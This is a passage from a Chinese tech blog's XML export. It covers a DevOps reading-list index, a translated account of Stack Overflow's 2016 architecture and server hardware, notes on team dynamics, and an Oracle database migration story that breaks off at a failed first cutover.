远程通信协议：从 CORBA 到 gRPC 基于Kafka构建事件溯源型微服务 LinkedIn 开源 Kafka Monitor 基于Go语言快速构建一个RESTful API服务 应用程序开发中的日志管理(Go语言描述) 数据可视化（七）Graphite 体系结构详解 参考文献 LinkedIn使用Kafka进行关键业务消息传输的经验总结 | 秦江杰@QCon]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>OpenSource</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[专题：DevOps 漫谈系列]]></title>
    <url>%2F2016%2F07%2F28%2FDevOps%2F</url>
    <content type="text"><![CDATA[摘要 DevOps 实践的本质是文化 持续交付 学习力 工程师的自我修养 Introduction to DevOps“开发运维” 这个词最初是在2008年1由帕特里克·德布瓦和安德鲁·谢弗提出的，并于 2009 年因为约翰·阿斯帕尔瓦和保罗·哈蒙德那场著名的“每天超过10次部署：Flickr的开发与运维合作”演讲，在 Velocity 技术大会广为流传。 DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 扩展阅读：分布式追踪系统 DevOps 漫谈：开源分布式跟踪系统 OpenCensus DevOps 漫谈：分布式追踪系统标准体系 远程通信协议：从 CORBA 到 gRPC 应用程序开发中的日志管理(Go语言描述) DevOps 资讯 | LinkedIn 开源 Kafka Monitor 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 构建 Gradle Tutorials and Guides 灵活强大的构建系统 Gradle | 美团点评技术团队 | bob ·2014-08-18 15:41 虚拟化 2018 年度 Docker 用户报告 - Sysdig Edition Cyber-Security: Linux 容器安全的十重境界 DevOps漫谈：Docker ABC Books 《凤凰项目|The Phoenix Project》 《持续交付：发布可靠软件的系统方法》 《Kanban 看板实战》 《SRE：Site Reliability Engineering》 《DevOps Automation Cookbook》 一些有趣的电子书 参考文献 约翰·威利斯，“开发运维的融合”，2012年“IT变革新闻”（博客），2014年 约翰·阿尔斯帕瓦和保罗·哈蒙德，“一天超过十次部署：Flickr 公司的开发与运维协同”，O’Reilly Web 性能与运维大会网站（O’Reilly Velocity Conference website），2009年6月23日]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：Stack Overflow 架构全解析]]></title>
    <url>%2F2016%2F07%2F17%2FOpenSource-StackOverflow%2F</url>
    <content type="text"><![CDATA[摘要 Stack Overflow 架构解析，其架构既有商业外包服务，也大量采用开源软件，可以全景式展现当代主流架构的风貌。Stack Overflow 由 Jeff Atwood 和 Joel Spolsky 这两个非常著名的 Blogger 在 2008 年创建。 第一篇：总体架构第二篇：硬件清单第三篇：部署流程 (未翻译) As of April 2014, Stack Overflow has over 4,000,000 registered users[19]and more than 10,000,000 questions,[20]with 10,000,000 questions celebrated[21]in late August 2015. Based on the type oftagsassigned to questions, the top eight most discussed topics on the site are:Java,JavaScript,C#,PHP,Android,jQuery,PythonandHTML。——wiki 总体架构Stack Overflow 可以分解为八个切面：互联网、负载均衡、web层、服务层、缓存、推送、搜索、数据库。 First Rule:Everything is redundant两个数据中心：纽约和科罗拉多，冗余且持续备份。其它所有关键组件都尽可能贯彻冗余原则。 物理架构 4 台 Microsoft SQL Server 服务器（其中 2 台使用了新的硬件） 11 台 IIS Web 服务器（新的硬件） 2 台 Redis 服务器（新的硬件） 3 台标签引擎服务器（其中 2 台使用了新的硬件） 3 台 Elasticsearch 服务器（同上） 4 台 HAProxy 负载均衡服务器（添加了 2 台，用于支持 CloudFlare） 2 台网络设备（Nexus 5596 核心 + 2232TM Fabric Extender，升级到 10Gbps 带宽） 2 台 Fortinet 800C 防火墙（取代了 Cisco 5525-X ASAs） 2 台 Cisco ASR-1001 路由器（取代了 Cisco 3945 路由器） 2 台 Cisco ASR-1001-x 路由器 逻辑架构The Internets 互联网DNS服务：外包CloudFlare + 自建DNS其实外包DNS服务应该已经可以满足服务，不过出于保险起见，还是有一套自建的DNS Server。 看来trust issues 中外一致啊。 Load Balancers 负载均衡HAProxy 1.5.15 on CentOS 7支持TLS (SSL)流量。关注HAProxy 1.7,它即将支持HTTP/2。 引入开源架构之后，就必须持续关注、跟进社区的发展动态。 吃着碗里的，看着锅里的，永远不能停。 Web Tier Web层IIS 8.5, ASP.Net MVC 5.2.3, and .Net 4.6.1Service Tier 服务层IIS, ASP.Net MVC 5.2.3, .Net 4.6.1, and HTTP.SYSCache缓存RedisL1级别：HTTP 缓存 L2级别：L1级别缓存失败之后，通过Redis获取数据 L1&amp;L2都是无法命中的情况下，会从数据库查询，并更新到缓存和Redis。 缓存更新：基于发布／订阅模型，利用这个机制来清除其他服务上的 L1 缓存，用来保持 web 服务器上的缓存一致性。另外Redis实例的CPU都很低，不到2%，这点很惊人。 Push推送开源库：NetGrain使用 Websocket 向用户推送实时的更新内容，比如顶部栏中的通知、投票数、新导航数、新的答案和评论。在高峰时刻，大约有 50 万个并发的 Websocket 连接，这可是一大堆浏览器。 一个有趣的事实：其中一些浏览器已经打开超过 18 个月了。Someone should go check if those developers are still alive！！ 问题：临时端口、负载均衡上的文件句柄耗尽，都是非常有趣的问题，我们稍后会提到它们。 Search搜索Elasticsearch集群，每个ES集群都有3个Node什么不用Solr？我们需要在整个网络中进行搜索（同时有多个索引），在我们进行决策的时候 Solr 还不支持这种场景。 还没有使用 2.x 版本的原因，是因为2.x 版本中类型（types）有了很大的变化，这意味着想要升级的话我们得重新索引所有内容。 没有足够的时间来制定需求变更和迁移的计划。 Database数据库SQLServerOur usage of SQL is pretty simple. Simple is fast. 数据库中只有一个存储过程，而且我打算把这个最后残留的存储过程也干掉，换成代码。 监控系统Opserver：轻量级监控系统，基于 asp.net MVC 框架，可监控：Servers SQL clusters/instances redis elastic search exception logs haproxy 数据库CPU very low Stack Overflow: The Hardware - 2016 Edition这是关于Stack Overflow架构的一系列文章中的第二篇。前一篇：《 Stack Overflow: 架构》（2016版）后一篇：《 Stack Overflow: 我们是如何做部署的》（2016版） 有人对硬件感兴趣吗？好吧，我感兴趣，这篇博客就是关于这个话题，所以，我赢了。如果你不关系硬件，那么可以走开并关闭浏览器了。还在这儿吗？真棒。假如你的网页访问非常非常慢，在这种情况下，你应该考虑采购一些新的硬件。 我曾今反复重申过多次：性能是一个重要组件。特别是当你的代码必须在最快的硬件上运行，硬件的关系则越为重大。正如任何其它的平台，Stack Overflow的架构是分层的。硬件对我们来说属于基础层，它有自己的屋子，在很多情况下，对我们来说，它的许多关键组件是不可控的。。。就像运行在别人的服务器。它也伴随着直接和间接的成本。但是，这些不是本篇文章的重点，这方面的对比将于稍后报告。目前来说，我希望能提供一份详细的，关于我们基础设施的清单，用于大家参考和比较。 服务器照片。有时是裸设备。这个网页可以加载得更快，但是我不能自禁。（言归正传）在这个系列报告中我将提供大量数字和规格说明。当我说“我们的SQL Server CPU利用率接近5-10%，” 好吧，这非常棒。但是，5-10% 的什么？ 这时我们需要一个参考值。这份硬件清单可以回答这些问题，并且座位与其它平台比较的依据，利用率对比如何，容量对比如何，等等。 How We Do Hardware免责声明：我不是一个人干的。 George Beech (@GABeech) 是我的主要搭档，盘点管控Stack使用的硬件。我们小心地规范每一台服务器，以使它符合设计意图。 我们不会只管下订单、分派任务。在这个过程中我们也不会自己单独完成；你必须知道将来这些硬件需要运行什么东西，才能做出合适的选择。我们将和开发工程师或者其他的可靠性工程师一道，为运行在盒子上的应用选择最佳方案。我们也关注在整个系统中什么才是最好的。每一台服务器都不是孤岛。如何将它嵌入到总体的架构中去，确实需要好好考量。哪些服务可以全平台共享？数据中心？日志系统？管理更少的事情，或者至少做到更少的差异，这件事本身就具有内在的价值。 当我们盘点硬件的时候，我们列出了很多规则来帮助我们厘清哪些是需要提供的。我还从没有真正写下这些心里面的检查表，简短来说： 这是一个升级或降级的问题吗？（我们购买一个更大的机器，或者一些更小的？ 我们需要／希望做到什么程度的冗余? (多少预留空间和故障恢复能力?) 存储: 服务器／应用需要挂在磁盘吗？(我们是否需要Spinny操作系统驱动?) 如果是，需要多少？（多大的网络带宽？有多少小文件？是否需要固态硬盘？） 如果是SSD（固态硬盘），是否写负载？（我们讨论 Intel S3500/3700s? P360x? P3700s?) 我们需要多少SSD容量? (是否可以采用同时搭载HDD（机械硬盘）的双轮方案?) 数据是否需要完全缓存？（相比没有电容器的SSD，哪一种更便宜，哪种更合适？） 将来存储是否需要扩展? (我们采用1U/10-bay 服务器, 或者一个 2U/26-bay 服务器?) 这是一个数据仓库的场景设定吗？（我们是否考虑3.5’’驱动器？如果是，每个2U主板上是12个还是16个驱动器？） 对于3.5’’的后板来说，存储平衡在在处理器上是否能达到 120W TDP 的限制? 我们是否需要直接显示磁盘？（控制器是否需要支持pass-through?) 内存: 它需要多少内存？（我们必须买什么？） 它将会使用多少内存？（我们最好买什么？） 我们是否认为它稍后需要更多的内存？（我们应该搭配那种内存频率？） 它是一个内存消耗型应用程序吗？（我们是否想要达到最大主频？） 它是一个高并发的应用程序吗？（一定空间的情况下，我们是否想要通过更多的DIMM来分摊内存？） CPU: 我们希望采用哪种类型的处理器？（我们需要CPU自己供电还是独立电源？） 它是高并发的应用程序吗？（我们希望采用更少、更快的内核？或者，采用数量更多，更慢的内核？） 以下哪种情况？是否存在大量的二级和三级缓存竞争？（为了提高性能，我们是否需要一个巨大的三级缓存？） 应用瓶颈主要是单一内核吗？（我们是否采用最大主频？） 如果是这样的话，同时需要支持多少进程数？（这里我们希望采用哪种引擎？） 网络: 我们是否需要增加 10Gb 网络连接？（此处是否为透传设备，例如一个负载均衡器？） 我们需要怎样的出／入流量均衡策略？（哪个CPU内核负责计算均衡权重？） 冗余: 我们在数据缓存中心是否也需要服务器？ 我们是否需要在同等数量的情况下，接受更低的冗余要求？ 我们是否需要一个电源线？不。我们不需要。 现在，让我们来看看服务网站的都有哪些硬件，它们位于纽约 （New York）QTS 数据中心。实际上，它位于新泽西（New Jersey)，但是让我们保持这个约定。为什么我们称之为NY数据中心？因为我们不想重命名所有以NY-开头的服务器。（What ?!…）我将记录在下面的清单上，丹佛的情况，在规格和冗余级别上略有差别。 Hide Pictures (in case you’re using this as a hardware reference list later) Stack Overflow &amp; Stack Exchange 站点服务器纽约数据中心全局选项先说明一些全局配置，在下面每台服务器的介绍里就不重复了： 除非有特殊需要，不包含操作系统驱动。大多数服务器使用一对250 或者 500 GB SATA HDD 硬盘 ，用于操作系统，通常是 RAID 1。我们不担心启动时间问题，所有物理服务器，启动时间中的大部分不依赖驱动的速度（例如，检查768GB内存）。 所有服务器通过2个或以上10Gb网络链路连接，通过双活LACP协议。 所有服务器运行在208V 单相功率电源 (经由2个PSU ，来自2个PDU-双电源). 在纽约的所有服务器由缆线臂，在丹佛的服务器则没有（主要依靠本地工程师）。 所有服务器都有一个iDRAC连接 (经由管理网络) 和一个KVM连接。 网络 2x Cisco Nexus 5596UP 核心交换机 (96 SFP+ 端口，每个端口 10 Gbps) 10x Cisco Nexus 2232TM Fabric Extenders (2 per rack - each has 32 BASE-T ports each at 10Gbps + 8 SFP+ 10Gbps 上联链路) 2x Fortinet 800C 防火墙 2x Cisco ASR-1001 路由器 2x Cisco ASR-1001-x 路由器 6x Cisco 2960S-48TS-L 网管交换机 (1 Per Rack - 48 1Gbps ports + 4 SFP 1Gbps) 1x Dell DMPU4032 KVM 7x Dell DAV2216 KVM Aggregators (1–2 per rack - each uplinks to the DPMU4032) 原作者备注: 每个 FEX 到核心 拥有 80 Gbps 上联带宽 ，核心通过一个160 Gbps端口通道与它们连接。由于最近的一些工程，我们位于丹佛数据中心的硬件会更新一些。所有4 台路由器的型号是 ASR-1001-x 和 双核 Cisco Nexus 56128P,每个都拥有96 SFP+ 10Gbps 端口 和 8 QSFP+ 40Gbps 端口。这些节省下来的端口，可以用于未来扩展，我们可以为核心绑定4x 40Gbps链接，替代每个 16x10Gbps端口的方案，正如我们在纽约做的那样。这些就是纽约的网络设备情况: 丹佛数据中心这里需要提到的是Mark Henderson, 我们网站的可靠性工程师之一，专程到纽约数据中心为我的这份报告拿到了一些高分辨率的照片。 SQL Servers (Stack Overflow 集群) 2 Dell R720xd 服务器，每台配置如下: 双 E5-2697v2 处理器 (每个 12 核 @2.7–3.5GHz) 384 GB of RAM (24x 16 GB DIMMs) 1x Intel P3608 4 TB NVMe PCIe SSD (RAID 0, 2块卡上两个控制器) 24x Intel 710 200 GB SATA SSDs (RAID 10) 双 10 Gbps 网络 (Intel X540/I350 NDC)SQL Servers (Stack Exchange 及其它业务集群) 2 Dell R730xd Servers, each with: 双 E5-2667v3 处理器 (每个8 核 @3.2–3.6GHz) 768 GB of RAM (24x 32 GB DIMMs) 3x Intel P3700 2 TB NVMe PCIe SSD (RAID 0) 24x 10K Spinny 1.2 TB SATA HDDs (RAID 10) 双 10 Gbps 网络 (Intel X540/I350 NDC)原作者备注: 丹佛的SQL硬件在规格上相同，对应纽约部分这里只有一个 SQL 服务器这是二月份为纽约的SQL Server 升级PCIe SSD的情形： Web 服务器 11 Dell R630 服务器，每台配置如下: 双 E5-2690v3 处理器 (每个12 核 @2.6–3.5GHz) 64 GB of RAM (8x 8 GB DIMMs) 2x Intel 320 300GB SATA SSDs (RAID 1) 双 10 Gbps 网络 (Intel X540/I350 NDC) 应用服务器 (Workers) 2 Dell R630 服务器, 每台配置如下: 双 E5-2643 v3 处理器(每个 6 核 @3.4–3.7GHz) 64 GB of RAM (8x 8 GB DIMMs) 1 Dell R620 服务器,配置如下: 双 E5-2667 处理器 (每个6 核 @2.9–3.5GHz) 32 GB of RAM (8x 4 GB DIMMs) 2x Intel 320 300GB SATA SSDs (RAID 1) 双 10 Gbps 网络 (Intel X540/I350 NDC) 原作者备注: NY-SERVICE03 目前仍然是一台 R620, 但是现在并没有足够老到以至于需要更换。它会在今年晚些时候升级。 Redis 服务器 (缓存) 2 Dell R630 服务器, 每台配置如下: 双 E5-2687W v3 处理器 (每个10 核 @3.1–3.5GHz) 256 GB of RAM (16x 16 GB DIMMs) 2x Intel 520 240GB SATA SSDs (RAID 1) 双 10 Gbps 网络 (Intel X540/I350 NDC) Elasticsearch 服务器 (检索) 3 Dell R620 服务器, 每台配置如下: 双 E5-2680 处理器 (每个8 核 @2.7–3.5GHz) 192 GB of RAM (12x 16 GB DIMMs) 2x Intel S3500 800GB SATA SSDs (RAID 1) 双 10 Gbps 网络 (Intel X540/I350 NDC) HAProxy 服务器 (负载均衡器) 2 Dell R620 服务器 (流量来源CloudFlare), 每台配置如下: 双 E5-2637 v2 处理器 (每个4 核 @3.5–3.8GHz) 192 GB of RAM (12x 16 GB DIMMs) 6x Seagate Constellation 7200RPM 1TB SATA HDDs (RAID 10) (日志) 双 10 Gbps 网络 (Intel X540/I350 NDC) - (DMZ)内网流量 双 10 Gbps 网络 (Intel X540) - 外网流量 2 Dell R620 服务器 (直达流量), 每台配置如下: 双 E5-2650 处理器 (每个 8 核 @2.0–2.8GHz each) 64 GB of RAM (4x 16 GB DIMMs) 2x Seagate Constellation 7200RPM 1TB SATA HDDs (RAID 10) (日志) 双 10 Gbps 网络 (Intel X540/I350 NDC) - (DMZ) 外网流量 双 10 Gbps 网络 (Intel X540) - 外网流量 原作者备注: 这些服务器是不同时期采购的，因此规格上略有差异。并且，2台CloudFlare负载均衡器因为安装了memcached,拥有更多内存（我们现在已经不运行该组件）。这些服务，redis, 检索,和负载均衡器在stack都是基于1U 服务器。这是纽约的情况： 其它服务器我们还有一些其他的服务器并不直接或间接服务于网站的流量。它们负责处理一些相关业务（例如，域名控制器，少量用于应用验证，跑在虚拟机上），或者一些次要的采购用于监控，日志存储，备份等等。既然已经表示未来会做一系列的报告，我把一切有趣的“后台”服务器也列出来。使我可以将更多的服务器拿出来和你分享，有人不喜欢的吗？ VM 服务器 (VMWare, 当前) 2 Dell FX2s Blade Chassis, each with 2 of 4 blades populated 4 Dell FC630 Blade Servers (2 per chassis), each with: 双 E5-2698 v3 处理器 (每个16 核 @2.3–3.6GHz) 768 GB of RAM (24x 32 GB DIMMs) 2x 16GB SD Cards (Hypervisor - no local storage) 双 4x 10 Gbps 网络 (FX IOAs - BASET) 1 EqualLogic PS6210X iSCSI SAN 24x Dell 10K RPM 1.2TB SAS HDDs (RAID10) 双 10Gb 网络 (10-BASET) 1 EqualLogic PS6110X iSCSI SAN 24x Dell 10K RPM 900GB SAS HDDs (RAID10) 双 10Gb 网络 (SFP+) 在一些场景下，还有几台重要的服务器不是虚拟机。这些系统后台任务，帮助我们通过日志追踪排查问题，存储大量的数据等等。 机器学习服务器 (Providence)这些服务器99%的时间是空闲的，但是每晚承担了大量的处理工作：刷新Providence。它们也可以通过内部数据中心的方式，用来测试基于海量数据的新算法。 2 Dell R620 服务器, 每台配置如下: 双 E5-2697 v2 处理器 (每个 12 核 @2.7–3.5GHz) 384 GB of RAM (24x 16 GB DIMMs) 4x Intel 530 480GB SATA SSDs (RAID 10) 双 10 Gbps 网络 (Intel X540/I350 NDC) 译者注：Providence，应为项目代号。Providence通过分析流量日志，给网站的访问用户打标签 (类似“web开发者” 或者 “使用Java技术栈”) 。详细可以查阅[https://kevinmontrose.com/2015/01/27/providence-machine-learning-at-stack-exchange/] 机器学习服务器－Redis (Still Providence)这是一个为 Providence服务的redis数据集。它们通常是一台主用，一台备用，还有一个实例是用于测试，如最新版的ML算法。当它不用做Q&amp;A站点时，这些数据会服务于职位招聘的边栏广告。 3 Dell R720xd 服务器,每台配置如下: Dual E5-2650 v2 Processors (8 cores @2.6–3.4GHz each) 384 GB of RAM (24x 16 GB DIMMs) 4x Samsung 840 Pro 480 GB SATA SSDs (RAID 10) Dual 10 Gbps network (Intel X540/I350 NDC) 日志服务器(各种日志）我们的 Logstash 集群 (使用 Elasticsearch 存储) ，数据来源于，任何地方。我们曾计划将HTTP日志复制一份到这些服务器，但是由于影响性能的问题而没有实现。尽管如此，我们还是将所有的网络设备日志，syslog，Windows和Linux系统日志存在这里，所以我们能够建立建立一个网络的全局视图，或者快速地排查问题。当告警发生的时候，它也被用作Bosun的一个数据源。这个集群总计使用的存储是 6x12x4 = 288 TB。 6 Dell R720xd 服务器, 每台配置如下: Dual E5-2660 v2 Processors (10 cores @2.2–3.0GHz each) 192 GB of RAM (12x 16 GB DIMMs) 12x 7200 RPM Spinny 4 TB SATA HDDs (RAID 0 x3 - 4 drives per) 双 10 Gbps 网络 (Intel X540/I350 NDC) SQL Server－HTTP日志 在这些服务器，我们将访问负载均衡器的单独HTTP请求，存储到SQL数据库(来源于HAProxy syslog）。我们只记录少数高级别的请求，类似URL，查询，UserAgent,SQL执行时间，Redis，等等。在这里的数据，每天将进入一个集群的Columnstore 索引。我们借助这些数据排查用户的问题，发现僵尸网络，等等。 1 Dell R730xd 服务器，配置如下: 双 E5-2660 v3 处理器 (每个10 核 @2.6–3.3GHz) 256 GB of RAM (16x 16 GB DIMMs) 2x Intel P3600 2 TB NVMe PCIe SSD (RAID 0) 16x Seagate ST6000NM0024 7200RPM Spinny 6 TB SATA HDDs (RAID 10) 双 10 Gbps 网络 (Intel X540/I350 NDC) SQL Server - 开发 我们喜欢尽可能多地模拟生产环境，类似SQL匹配，额，至少是它过去常常发生的那样。们一直以来这购买升级生产处理器。我们会将升级这些服务器，采用2U 解决方案，在今年晚些升级Stack Overflow 集群的时候一起做。 1 Dell R620 服务器，配置如下: 双 E5-2620 处理器 (每个6核 @2.0–2.5GHz) 384 GB of RAM (24x 16 GB DIMMs) 8x Intel S3700 800 GB SATA SSDs (RAID 10) 双 10 Gbps 网络 (Intel X540/I350 NDC) 这些就是实际服务我们网站的硬件，或者说大家普遍感兴趣的部分。我们当然还有其它服务器，用于后台任务，例如日志记录，监控，备份，等等。如果你对于我们其它系统还有特别感兴趣的地方，请尽管留言提问，我很高兴回答。 这是一周多以前在纽约的全程： 接下来？我做的这一系列工作是希望能让社区了解到最多情况。通过Trello board, 它让部署看起来像是下一个最有趣的话题。预计下一次将让大家了解代码是如何从开发者的机器到生产环境，以及这个过程中解决的所有问题。它将覆盖数据库迁移，滚动构建，CI 组件，我们如何建立开发环境，所有要素如何共享信息等。 参考文献 How Netflix works: the (hugely simplified) complex stuff that happens every time you hit Play]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[组织论:群体行为模式]]></title>
    <url>%2F2016%2F06%2F15%2FTeamWork%2F</url>
    <content type="text"><![CDATA[摘要 群体智慧 瘾品 项目管理工具 一些不成熟的构思 团队重建中的心理问题 外科手术模式 交响乐队模式 协作与保密 协作与保密 因为我们希望这两个部门在这么机密的事情上不要通气。你只需要告诉他们如何安全地保管这些化学品就可以了。”我说，在我看来，如果他们不知道这些原理，他们就不可能理解并遵守那一大堆规则，除非他们知道这其中的原理。所以我的观点是，我必须告诉他们原理，否则洛斯阿拉莫斯不对橡树岭的安全负责！– 理查德·费曼 《发现的乐趣》 群体智慧 保持群体智慧的唯一方式是保护每个人的独立性。–乔纳-莱勒（Jonah Lehrer） 群体会对特定类型的问题给出较好的答案。当大量的人做出回应时，他们产生了很多答案，但其平均值、中位数或最常见的回答往往会是一个很好的答案。这比人们被彼此隔离来发表独立意见更为可行。……但是，当人们看到别人提供的答案后，就出现了一些不好的事情。人们会修改自己的答案，从而造成最后的答案集合变得不够多样化，这样最好的答案就可能无法脱颖而出。人们通过强化会变得更加自信，但是精确度却没有改进。群体智慧依赖于多样性和独立性。在社交网络上（以及在企业、组织和政府机构工作的人员团队中），同事压力和主导人物可能会降低该团体的智慧。（《火的礼物-人类与计算技术的终极博弈（第4版）》，Sara Baase（莎拉芭氏），P308） 人类认知与行为模式嗑药简史：关于瘾品，成瘾机制及其历史 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、性行为、运动、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 瘾品的管制思路变迁：禁令还是放纵？ 《上瘾五百年: 烟、酒、咖啡和鸦片的历史》|戴维·考特莱特 综合了心理、药物、经济、文化、生态等领域的研究，详细介绍所有能让人类成瘾的物品，以及瘾品背后的经济、文化和战争。瘾品在历史上的力量有多大？它们为何有合法与违禁之分？是什么力量将瘾品的流行推动为规模庞大、模式各异的商品贸易？作者从瘾品的功能用途到它们的发现，到全球贸易的流通和经济政策，全面介绍精神瘾品的文化，追踪出大众化瘾品进入全球贸易主流的来龙去脉，内容有趣，视野广博，令人眼界大开。毫无疑问，它是一本关于瘾品文化史的经典著作，也是一本横跨世界史与药物史的杰作。 项目管理工具 Kanban 看板管理实践 基于Redmine的项目管理平台 Research Nature 论文|噬菌体之间的信息传递和群体决策 科学网论坛：你既然这样穷，为什么搞科研？ 参考文献 《火的礼物-人类与计算技术的终极博弈（第4版）》，Sara Baase（莎拉芭氏） 酷壳：让我们来谈谈分工 如何面试工程师 | Ammon Bartram 浅析在国内做不出好成果的原因 | 2015-11-16 鲍永利 科研圈 团队里的两类程序员]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>eBook</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Oracle 数据库迁移与割接实践]]></title>
    <url>%2F2016%2F06%2F12%2FTechnology-Oracle%2F</url>
    <content type="text"><![CDATA[摘要 一、项目背景 二、主要困难 三、迁移前准备 四、失败的体验：没有一帆风顺 五、总结 一、项目背景某企业支撑系统，已经连续服务七年有余。算起来比我的工作年限还要长。 历年工程中，硬件、软件、运营团队都更新换了好几茬，单独系统核心数据库—— 一台小型机搭载Oracle 10g，附加一套磁盘阵列，从来没有动过。 随着近年的业务暴涨、负载上升、硬件老化，服务器、磁盘都时有故障发生，负载水平线逼近极限，故障率还有加速抬头的趋势。整个运营团队面临了巨大的客户压力，提升系统稳定性的巨大挑战摆在了大家面前。 二、主要困难 在“天塌地陷”的不利局面中加入进来。 2.1 困难1: 团队大动荡原运营团队，包括但不限于资深项目经理、技术负责人、多名工程师等，先后因各种原因，在很短的时间内集中离职了。在接手之前，对于该项目我一无所知，接手以后短暂的交接过程中，也很难获取多少有价值的信息。 连续发生突发重大故障，我们面临巨大的商务压力，团队内部疲惫不堪、心理压力极大、士气低落。每一次大故障，所有人都得没日没夜地处理，处理好以后还得写材料汇报，汇报之后也未必能得到客户的首肯。甚至在某种程度上说，急剧增长的故障率进一步刺激、增加了离职率。正如一位哲人说的： 降低故障率是提升团队幸福指数的首要保障。— 弗拉基米.耶维奇.严 2.2 困难2: 拓扑大调整系统的拓扑结构最初是星型：以数据库和应用服务器为核心，外挂近100台服务器。数据库服务器配置双网卡，连通内网、外网。 虽然星型结构简单易用，却也存在较大的安全隐患。在早期建设的时候，规范尚未健全，还可以用业务优先的理由搪塞过去。在本期工程中，非常明确必须要完成内外网分离的改造。 2.3 困难3: 安全一票否决Oracle 版本由10g 升级到 11g，集中管理访问权限。最大限度地提高安全性，口令60天更换一次，不能因为更换口令中断业务；如果出现连续的错误口令访问，甚至不惜锁定数据库。 从正向的角度看，这些严格规定可以倒逼改造。在软件架构规范化不足、自动化严重不足的条件下，整个迁移期间，这个问题确实给我们造成了极大困扰。 三、迁移前准备基于上述三大问题，在正式迁移之前主要做了下列几项工作： 3.1 加强监控手段，降低日常故障率； 梳理需要监控的基础指标和业务指标，侧重关键业务可用性。例如，某业务的正常调度周期是3小时，部署模拟脚本，将模拟脚本的调度频率提高到5分钟一次甚至更高，通过高密度的执行，主动触发风险点，一些隐藏的问题就比较容易暴露出来。 3.2 重点培训新人，稳定队伍； 本质上说，这次迁移工作的首要任务不在技术、也不在数据，而在于人。 上一个团队整体流失，新补充的人员又完全没有相关经验，可以说是从0开始。基于该阶段的特殊情况，我选择了实质性暂停迁移工作，而把主要的精力投入到人员培训和组织重建上来。 关于这块内容比较复杂，实际是另外一个主题，计划后续再发布，敬请关注。 3.3 梳理全局视图，调研周边系统关系链；全局视图实际上也包括技术和人两个维度： 1）重绘系统架构图：可以参考现有文档资料，但是主要应该立足于自主调研。绘制的过程，即是收集、整理的过程，也是制定迁移方案的思考过程。唯有自己动手，才能加深认识，做到胸有成竹。 2）大量接触相关方面的领导、配合部门以及第三方厂家： 个人工作经历方面，独立工作的场景居多，自己能直接控制的情况居多，不太需要理会复杂的部门关系、人际关系。这项工作对于某些人来说比较容易，但是对我而言，其实是有过一段比较困难的过程。 3.4 数据复制主要实现：OGG + dblink+ 自主迁移程序。 OGG：即Oracle Golden Gate方案。在最早的方案中，我们打算完全依赖OGG来实现数据复制，但是在实验阶段发现，该方案有其限制条件。第一、历史遗留系统有庞大的历史数据，如果都用OGG，无法确保新库的及时性、一致性。第二、由于管理的不规范，存在很多该做分区而没有做分区的大表，而且这样的表，数量很多，一时还真的很难分离出来。 DB Link: 提供了旧－&gt;新库之间的快速连接通道。 自主迁移程序：针对特殊大分区表。例如A表是大量的原始数据，每天一个分区，每个分区约为4000万条记录，一个月就有1.2亿条。由于业务上非常重要，该表的数据必须迁移到新库。针对这个问题，我们自己编写了迁移脚本。按照“少量、多批次、并行”的原则，实现数据推送。 首先，控制每个批次提交的记录数，将每个分区4000万的数据，切分成10万一份的小切片，这样即使失败也能快速重试，还能杜绝UNDO表空间暴涨（例如exp/imp整个分区的方式）。 基于小粒度的切片，进一步就可以实现多批次、多进程的并行推送，从而保证每个commit和时间单元的推送规模都完全可控、可视。 3.5 双库并行部署在所有采集服务器开启两个入库进程，即一份原始结果同时入两套数据库。最大限度在没有额外测试系统的条件下，利用现有资源，模拟仿真正式生产环境的并发压力，同时完成负载均衡、单点故障验证测试。 并不是所有的程序都能轻易的实现双库并行，有的可能只要稍微调整配置文件，有些可能就必须修改代码，还有的可能就没法弄。从这个角度观察，第一种应该就是好的代码，灵活，适应各种可能的场景。后者则可能连配置－代码分离都没有做到，侵入式编程等。 3.6 转发入库组件开发开发这个东西的时候，我一度准备中途放弃。前两版发布测试的时候，起初都还不错，但是运行一段时间之后，就暴露出严重的性能问题，几乎不可用。多次调试都找不到原因。后来发现，最大的Bug不过是一个空指针异常的捕获不合理。 很不经意地修改几个字符之后，一切都顺畅起来，往后再也没有出一丁点问题。 很多时候可能就是这样，需要一点灵性，需要一点运气。 3.7 割接工具开发系统配置收集器（例如口令配置必须保证强一致性）；转发路径监视（ 外网跳板到内网跳板、跳板到数据库等）；预配置／检查工具；连接 切换 &amp; 回退 工具； 四、失败的体验：没有一帆风顺 第一次割接失败了！ 失败的体验 第一次割接之后，系统各项功能正如我们预计的那样顺利运行。就在我们准备庆祝成功的时候，几项关键业务的吞吐量却急剧下降。初步判断是性能问题，因为每次连接时延飙升了100多倍，高达秒级，基本是不可用的。 人工排查几次以后，看到了大量的挂起进程，一堆的锁表。而且失败来源遍布一多半的服务器。虽然不想承认，但是我们不得不做出回退的决定。 